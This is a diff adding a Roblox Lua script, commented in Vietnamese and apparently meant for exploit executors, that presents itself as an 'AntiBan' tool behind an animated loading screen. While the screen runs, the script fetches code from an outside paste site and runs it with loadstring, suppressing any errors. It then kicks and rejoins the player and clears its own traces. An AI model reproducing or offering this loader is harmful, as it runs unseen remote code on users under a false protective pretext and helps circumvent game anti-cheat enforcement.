@@ -1,0 +1,228 @@
+--// Script tổng hợp: Giao diện + Loader + Kick + Rejoin + Dọn dẹp dữ liệu
+-- Đặt script này vào StarterGui dưới dạng LocalScript
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local PlaceId = game.PlaceId
+
+-- Unique tag để dọn dẹp dữ liệu
+local ANTIBAN_TAG = "_ANTIBAN_TEMP"
+
+-- Chức năng dọn dẹp toàn bộ dữ liệu script
+local function cleanup()
+    -- Xóa UI
+    if playerGui:FindFirstChild("AntiBanScreen"..ANTIBAN_TAG) then
+        playerGui["AntiBanScreen"..ANTIBAN_TAG]:Destroy()
+    end
+    -- Xóa các giá trị toàn cục (nếu có)
+    if getgenv then
+        getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] = nil
+        getgenv()["ANTIBAN_LOADER"..ANTIBAN_TAG] = nil
+    end
+end
+
+-- Hàm rejoin
+local function rejoin()
+    cleanup()
+    TeleportService:Teleport(PlaceId, player)
+end
+
+-- Đảm bảo script không bị chạy nhiều lần
+if getgenv and getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] then return end
+if getgenv then getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] = true end
+
+-- Khởi tạo UI (copy từ script UI đã tối ưu, thêm tag)
+local function createUI()
+    if playerGui:FindFirstChild("AntiBanScreen"..ANTIBAN_TAG) then
+        playerGui["AntiBanScreen"..ANTIBAN_TAG]:Destroy()
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AntiBanScreen"..ANTIBAN_TAG
+    screenGui.IgnoreGuiInset = true
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = playerGui
+
+    local Background = Instance.new("ImageLabel")
+    Background.Name = "Background"
+    Background.Parent = screenGui
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.Position = UDim2.new(0, 0, 0, 0)
+    Background.BackgroundTransparency = 1
+    Background.Image = "rbxassetid://15136859462"
+    Background.ImageTransparency = 0.1
+    Background.ScaleType = Enum.ScaleType.Crop
+
+    local Overlay = Instance.new("Frame")
+    Overlay.BackgroundColor3 = Color3.fromRGB(10,10,10)
+    Overlay.BackgroundTransparency = 0.4
+    Overlay.Size = UDim2.new(1,0,1,0)
+    Overlay.Parent = Background
+
+    local Title = Instance.new("TextLabel")
+    Title.Parent = Background
+    Title.AnchorPoint = Vector2.new(0.5, 1)
+    Title.Position = UDim2.new(0.5, 0, 0.85, 0)
+    Title.Size = UDim2.new(0.92, 0, 0.15, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "🔥 Waiting For The AntiBan Enable 🔥"
+    Title.TextColor3 = Color3.fromRGB(0,255,255)
+    Title.TextStrokeTransparency = 0.2
+    Title.TextStrokeColor3 = Color3.fromRGB(255,0,255)
+    Title.Font = Enum.Font.FredokaOne
+    Title.TextScaled = true
+    Title.TextWrapped = true
+    Title.ZIndex = 10
+
+    local ProgressBarBg = Instance.new("Frame")
+    ProgressBarBg.Parent = Background
+    ProgressBarBg.AnchorPoint = Vector2.new(0.5, 1)
+    ProgressBarBg.Position = UDim2.new(0.5, 0, 0.96, 0)
+    ProgressBarBg.Size = UDim2.new(0.7, 0, 0.06, 0)
+    ProgressBarBg.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+    ProgressBarBg.BackgroundTransparency = 0
+    ProgressBarBg.BorderSizePixel = 0
+    ProgressBarBg.ClipsDescendants = true
+    ProgressBarBg.ZIndex = 2
+
+    local UICorner = Instance.new("UICorner", ProgressBarBg)
+    UICorner.CornerRadius = UDim.new(0.5,0)
+
+    local Stroke = Instance.new("UIStroke", ProgressBarBg)
+    Stroke.Thickness = 2
+    Stroke.Color = Color3.fromRGB(160, 160, 160)
+    Stroke.Transparency = 0.4
+
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Parent = ProgressBarBg
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    ProgressBar.BackgroundTransparency = 0
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.ZIndex = 3
+    local fillCorner = Instance.new("UICorner", ProgressBar)
+    fillCorner.CornerRadius = UDim.new(0.5,0)
+
+    local ProgressMarker = Instance.new("Frame")
+    ProgressMarker.Parent = ProgressBarBg
+    ProgressMarker.Size = UDim2.new(0, 8, 0.8, 0)
+    ProgressMarker.AnchorPoint = Vector2.new(0,0.5)
+    ProgressMarker.Position = UDim2.new(0, -3, 0.5, 0)
+    ProgressMarker.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    ProgressMarker.BackgroundTransparency = 0
+    ProgressMarker.BorderSizePixel = 0
+    ProgressMarker.ZIndex = 6
+    local markerCorner = Instance.new("UICorner", ProgressMarker)
+    markerCorner.CornerRadius = UDim.new(0.5,0)
+
+    local PercentLabel = Instance.new("TextLabel")
+    PercentLabel.Parent = ProgressBarBg
+    PercentLabel.AnchorPoint = Vector2.new(1, 0.5)
+    PercentLabel.Position = UDim2.new(1, -8, 0.5, 0)
+    PercentLabel.Size = UDim2.new(0.18, 0, 1.4, 0)
+    PercentLabel.BackgroundTransparency = 1
+    PercentLabel.Text = "1%"
+    PercentLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
+    PercentLabel.TextStrokeTransparency = 0.5
+    PercentLabel.Font = Enum.Font.FredokaOne
+    PercentLabel.TextScaled = true
+    PercentLabel.ZIndex = 9
+
+    -- Animation
+    local duration = 30
+    local percentStart = 1
+    local percentEnd = 100
+    local startTime = tick()
+    local finished = false
+    local hue = 0
+
+    local function updateTitleAnim(dt)
+        hue = (hue + dt*0.18) % 1
+        local color = Color3.fromHSV(hue, 0.85, 1)
+        Title.TextColor3 = color
+        Title.TextStrokeColor3 = Color3.fromHSV((hue+0.1)%1,0.5,1)
+        Title.Rotation = math.sin(tick()*2.5)*5
+    end
+
+    local function updatePercentColor(percent)
+        PercentLabel.TextColor3 = Color3.fromHSV(0.5 + percent/200, 0.7, 1)
+    end
+
+    local function updateProgress()
+        local elapsed = tick() - startTime
+        local alpha = math.clamp(elapsed / duration, 0, 1)
+        local percent = math.floor(percentStart + (percentEnd - percentStart) * alpha + 0.5)
+        ProgressBar.Size = UDim2.new(alpha, 0, 1, 0)
+        ProgressMarker.Position = UDim2.new(alpha, -4, 0.5, 0)
+        PercentLabel.Text = percent.."%"
+        updatePercentColor(percent)
+        if alpha >= 1 then
+            finished = true
+        end
+    end
+
+    local function updateMarkerAnim()
+        ProgressMarker.BackgroundTransparency = 0.1 + math.abs(math.sin(tick()*5))*0.15
+    end
+
+    local lastTick = tick()
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        if not finished then
+            local now = tick()
+            local dt = now - lastTick
+            lastTick = now
+            updateTitleAnim(dt)
+            updateProgress()
+            updateMarkerAnim()
+        else
+            connection:Disconnect()
+        end
+    end)
+
+    return screenGui, function()
+        finished = true
+        if connection then connection:Disconnect() end
+        screenGui:Destroy()
+    end
+end
+
+-- Khởi tạo UI
+local antibanGui, closeAntibanGui = createUI()
+
+-- Tải và chạy script ngoài (chạy song song)
+local loaderScript = loadstring(game:HttpGet("https://pastefy.app/f1J9Cddr/raw"))
+local loaderThread = coroutine.create(function()
+    if getgenv then getgenv()["ANTIBAN_LOADER"..ANTIBAN_TAG] = true end
+    pcall(loaderScript)
+end)
+coroutine.resume(loaderThread)
+
+-- Theo dõi sự kiện kick
+local kicked = false
+local kickConn
+kickConn = player.OnKick:Connect(function(reason)
+    kicked = true
+    if kickConn then kickConn:Disconnect() end
+    cleanup()
+    rejoin()
+end)
+
+-- Thời gian đếm ngược 30s
+local startTime = tick()
+while tick() - startTime < 30 do
+    if kicked then return end
+    wait(0.1)
+end
+
+-- Hết 30s -> kick và rejoin
+if kickConn then kickConn:Disconnect() end
+pcall(closeAntibanGui)
+cleanup()
+player:Kick("AntiBan Is Now Enabled")
+wait(1)
+rejoin()
